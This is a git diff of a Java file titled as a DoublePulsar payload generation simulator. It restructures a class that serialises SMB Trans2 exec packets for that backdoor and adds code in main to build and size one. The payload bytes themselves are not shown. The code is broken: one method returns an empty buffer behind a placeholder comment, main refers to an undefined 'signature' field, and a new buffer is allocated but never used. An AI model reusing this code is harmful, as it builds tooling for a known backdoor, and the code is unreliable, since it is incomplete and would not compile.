@@ -3,6 +3,7 @@ import java.util.*;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
 
+
 import java.io.UnsupportedEncodingException;
 /*
 Doublepulsar payload generation simulator
@@ -10,89 +11,138 @@ Doublepulsar payload generation simulator
 
 public class Main {
 
-public class SmbTrans2ExecPacket {
-    // Fields
-    public int smbMessageType;       // uint16_t
-    public int smbMessageLength;     // uint16_t
-
-    public byte[] protocolHeader = new byte[4]; // "\xffSMB"
-    public byte smbCommand;
-    public int ntStatus;
-    public byte flags;
-    public int flags2;               // uint16_t
-    public int processIDHigh;        // uint16_t
-    public byte[] signature = new byte[8];
-    public int reserved;
-    public int treeId;               // uint16_t
-    public int processID;            // uint16_t
-    public int userID;               // uint16_t
-    public int multipleID;           // uint16_t
-
-    public byte wordCount;
-    public int totalParameterCount;
-    public int totalDataCount;
-    public int maxParameterCount;
-    public int maxDataCount;
-    public byte maxSetupCount;
-    public byte reserved1;
-    public int flags3;               // uint16_t
-    public int timeout;
-    public int reserved2;
-    public int parameterCount;
-    public int parameterOffset;
-    public int dataCount;
-    public int dataOffset;
-    public byte setupCount;
-    public byte reserved3;
-    public int subcommand;           // uint16_t
-    public int byteCount;            // uint16_t
-    public byte padding;
-
-    public byte[] toBytes() {
-        ByteBuffer buffer = ByteBuffer.allocate(4178); // adjust size as needed
-        buffer.order(ByteOrder.LITTLE_ENDIAN);
-
-        // Header
-        buffer.putShort((short) smbMessageType);
-        buffer.putShort((short) smbMessageLength);
-
-        buffer.put(protocolHeader);
-        buffer.put(smbCommand);
-        buffer.putInt(ntStatus);
-        buffer.put(flags);
-        buffer.putShort((short) flags2);
-        buffer.putShort((short) processIDHigh);
-        buffer.put(signature);
-        buffer.putShort((short) reserved);
-        buffer.putShort((short) treeId);
-        buffer.putShort((short) processID);
-        buffer.putShort((short) userID);
-        buffer.putShort((short) multipleID);
-
-        // Parameters
-        buffer.put(wordCount);
-        buffer.putShort((short) totalParameterCount);
-        buffer.putShort((short) totalDataCount);
-        buffer.putShort((short) maxParameterCount);
-        buffer.putShort((short) maxDataCount);
-        buffer.put(maxSetupCount);
-        buffer.put(reserved1);
-        buffer.putShort((short) flags3);
-        buffer.putInt(timeout);
-        buffer.putShort((short) reserved2);
-        buffer.putShort((short) parameterCount);
-        buffer.putShort((short) parameterOffset);
-        buffer.putShort((short) dataCount);
-        buffer.putShort((short) dataOffset);
-        buffer.put(setupCount);
-        buffer.put(reserved3);
-        buffer.putShort((short) subcommand);
-        buffer.putShort((short) byteCount);
-        buffer.put(padding);
-
-        return buffer.array();
+    public class SmbTrans2ExecPacket
+    {
+        // Fields
+        public int smbMessageType;       // uint16_t
+        public int smbMessageLength;     // uint16_t
+    
+        public byte[] protocolHeader = new byte[4]; // "\xffSMB"
+        public byte smbCommand;
+        public int ntStatus;
+        public byte flags;
+        public int flags2;               // uint16_t
+        public int processIDHigh;        // uint16_t
+        public byte[] signature = new byte[8];
+        public int reserved;
+        public int treeId;               // uint16_t
+        public int processID;            // uint16_t
+        public int userID;               // uint16_t
+        public int multipleID;           // uint16_t
+    
+        public byte wordCount;
+        public int totalParameterCount;
+        public int totalDataCount;
+        public int maxParameterCount;
+        public int maxDataCount;
+        public byte maxSetupCount;
+        public byte reserved1;
+        public int flags3;               // uint16_t
+        public int timeout;
+        public int reserved2;
+        public int parameterCount;
+        public int parameterOffset;
+        public int dataCount;
+        public int dataOffset;
+        public byte setupCount;
+        public byte reserved3;
+        public int subcommand;           // uint16_t
+        public int byteCount;            // uint16_t
+        public byte padding;
+    
+        public byte[] toBytes() {
+            ByteBuffer buffer = ByteBuffer.allocate(4178); // adjust size as needed
+            buffer.order(ByteOrder.LITTLE_ENDIAN);
+    
+            // Header
+            buffer.putShort((short) smbMessageType);
+            buffer.putShort((short) smbMessageLength);
+    
+            buffer.put(protocolHeader);
+            buffer.put(smbCommand);
+            buffer.putInt(ntStatus);
+            buffer.put(flags);
+            buffer.putShort((short) flags2);
+            buffer.putShort((short) processIDHigh);
+            buffer.put(signature);
+            buffer.putShort((short) reserved);
+            buffer.putShort((short) treeId);
+            buffer.putShort((short) processID);
+            buffer.putShort((short) userID);
+            buffer.putShort((short) multipleID);
+    
+            // Parameters
+            buffer.put(wordCount);
+            buffer.putShort((short) totalParameterCount);
+            buffer.putShort((short) totalDataCount);
+            buffer.putShort((short) maxParameterCount);
+            buffer.putShort((short) maxDataCount);
+            buffer.put(maxSetupCount);
+            buffer.put(reserved1);
+            buffer.putShort((short) flags3);
+            buffer.putInt(timeout);
+            buffer.putShort((short) reserved2);
+            buffer.putShort((short) parameterCount);
+            buffer.putShort((short) parameterOffset);
+            buffer.putShort((short) dataCount);
+            buffer.putShort((short) dataOffset);
+            buffer.put(setupCount);
+            buffer.put(reserved3);
+            buffer.putShort((short) subcommand);
+            buffer.putShort((short) byteCount);
+            buffer.put(padding);
+    
+            return buffer.array();
+        }
+    
+        
+        public byte[] CalculateBytes() {
+            int totalSize = 0;
+        
+            totalSize += 2; // smbMessageType
+            totalSize += 2; // smbMessageLength
+            totalSize += protocolHeader.length;
+            totalSize += 1; // smbCommand
+            totalSize += 4; // ntStatus
+            totalSize += 1; // flags
+            totalSize += 2; // flags2
+            totalSize += 2; // processIDHigh
+            totalSize += signature.length;
+            totalSize += 2; // reserved
+            totalSize += 2; // treeId
+            totalSize += 2; // processID
+            totalSize += 2; // userID
+            totalSize += 2; // multipleID
+        
+            totalSize += 1; // wordCount
+            totalSize += 2; // totalParameterCount
+            totalSize += 2; // totalDataCount
+            totalSize += 2; // maxParameterCount
+            totalSize += 2; // maxDataCount
+            totalSize += 1; // maxSetupCount
+            totalSize += 1; // reserved1
+            totalSize += 2; // flags3
+            totalSize += 4; // timeout
+            totalSize += 2; // reserved2
+            totalSize += 2; // parameterCount
+            totalSize += 2; // parameterOffset
+            totalSize += 2; // dataCount
+            totalSize += 2; // dataOffset
+            totalSize += 1; // setupCount
+            totalSize += 1; // reserved3
+            totalSize += 2; // subcommand
+            totalSize += 2; // byteCount
+            totalSize += 1; // padding
+        
+            ByteBuffer buffer = ByteBuffer.allocate(totalSize);
+            buffer.order(ByteOrder.LITTLE_ENDIAN);
+        
+            // ... same put() operations as before
+        
+            return buffer.array();
+        }
     }
-}
+
 
     public static byte[] trans2_exec = new byte[] {
 
@@ -414,6 +464,58 @@ public class SmbTrans2ExecPacket {
         netbios_len[0] = (byte) ((last_smb_count >> 8) & 0xFF); // High byte
         netbios_len[1] = (byte) (last_smb_count & 0xFF);        // Low byte
         */
+        
+        SmbTrans2ExecPacket packet = new SmbTrans2ExecPacket();
+        packet.smbMessageType = 0x0000;
+        packet.smbMessageLength = 0x0042;
+        // ... populate all other fields as needed
+        packet.protocolHeader = new byte[] { (byte) 0xFF, 'S', 'M', 'B' };
+        
+        byte[] serialized = packet.toBytes();
+        
+        
+        int PackettotalSize = 0;
+        
+            PackettotalSize += 2; // smbMessageType
+            PackettotalSize += 2; // smbMessageLength
+            PackettotalSize += packet.protocolHeader.length;
+            PackettotalSize += 1; // smbCommand
+            PackettotalSize += 4; // ntStatus
+            PackettotalSize += 1; // flags
+            PackettotalSize += 2; // flags2
+            PackettotalSize += 2; // processIDHigh
+            PackettotalSize += signature.length;
+            PackettotalSize += 2; // reserved
+            PackettotalSize += 2; // treeId
+            PackettotalSize += 2; // processID
+            PackettotalSize += 2; // userID
+            PackettotalSize += 2; // multipleID
+        
+            PackettotalSize += 1; // wordCount
+            PackettotalSize += 2; // totalParameterCount
+            PackettotalSize += 2; // totalDataCount
+            PackettotalSize += 2; // maxParameterCount
+            PackettotalSize += 2; // maxDataCount
+            PackettotalSize += 1; // maxSetupCount
+            PackettotalSize += 1; // reserved1
+            PackettotalSize += 2; // flags3
+            PackettotalSize += 4; // timeout
+            PackettotalSize += 2; // reserved2
+            PackettotalSize += 2; // parameterCount
+            PackettotalSize += 2; // parameterOffset
+            PackettotalSize += 2; // dataCount
+            PackettotalSize += 2; // dataOffset
+            PackettotalSize += 1; // setupCount
+            PackettotalSize += 1; // reserved3
+            PackettotalSize += 2; // subcommand
+            PackettotalSize += 2; // byteCount
+            PackettotalSize += 1; // padding
+            
+        ByteBuffer DOPU_PACKET = ByteBuffer.allocate(PackettotalSize);
+        DOPU_PACKET.order(ByteOrder.LITTLE_ENDIAN);
+
+
+
 
 
     }
